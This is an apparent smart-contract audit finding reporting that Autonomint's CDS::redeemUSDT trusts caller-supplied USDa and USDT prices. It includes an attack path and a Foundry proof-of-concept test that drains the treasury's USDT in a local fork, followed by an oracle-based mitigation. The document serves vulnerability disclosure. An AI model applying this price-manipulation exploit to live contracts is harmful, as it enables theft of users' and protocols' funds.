# CDS::redeemUSDT will allow anyone to drain treasury USDT with price manipulation

### Summary

`CDS::redeemUSDT` does not use usdaPrice and usdtPrice from the oracle, but from the parameters `usdaPrice` and `usdtPrice` that a user can manipulate to their advantage and drain the treasury of its USDT.

[CDS::redeemUSDT](https://github.com/sherlock-audit/2024-11-autonomint/blob/0d324e04d4c0ca306e1ae4d4c65f0cb9d681751b/Blockchain/Blockchian/contracts/Core_logic/CDS.sol#L506)

### Root Cause

Oracle is not used for USDa and USDT prices in `CDS::redeemUSDT`. Prices should not be set by the user through the parameters.

### Internal pre-conditions

- User deposits in CDS
- User swaps USDa for USDT with `redeemUSDT`
- User has USDa

### External pre-conditions

None

### Attack Path

1. User deposits in CDS to receive USDa
2. User swaps USDa for USDT with `redeemUSDT`
3. User sets usdaPrice and usdtPrice parameters to drain entire treasury USDT
4. All USDT in treasury is drained

### Impact

All USDT in treasury can be drained by any user with USDa in CDS.

### PoC

- Insert the PoC in `borrowing.t.sol`
- Run the test with `forge test --fork-url http://127.0.0.1:8545 --mt testUserCanManipulatePricesInRedeemUSDT -vvvv`

```javascript
function testUserCanManipulatePricesInRedeemUSDT() public {
        // Treasury and User minted tokens for testing vulnerability
        contractsA.usdt.mint(address(contractsA.treasury), 10000000000);
        contractsA.usda.mint(address(USER),5000000000);

        // User approves CDS and redeems USDa for USDT with manipulated prices
        vm.startPrank(USER);
        contractsA.usda.approve(address(contractsA.cds), 5000000000);
        contractsA.cds.redeemUSDT{value: globalFee3.nativeFee}(1, 10000000000, 1);
        vm.stopPrank();

        // User drains entire treasury with just one USDa amount since 1 USDa = 1e10 USDT as seen in set parameters
        // User USDT balance is 1e10 after redeem because of manipulated prices
        uint256 usdtBalanceAfterRedeem = contractsA.usdt.balanceOf(address(USER));
        assertEq(usdtBalanceAfterRedeem, 10000000000);
    }
```

### Mitigation

Use oracle prices for USDa price and USDT price in `CDS::redeemUSDT` instead of allowing the user to set the prices through the parameters `usdaPrice` and `usdtPrice`.
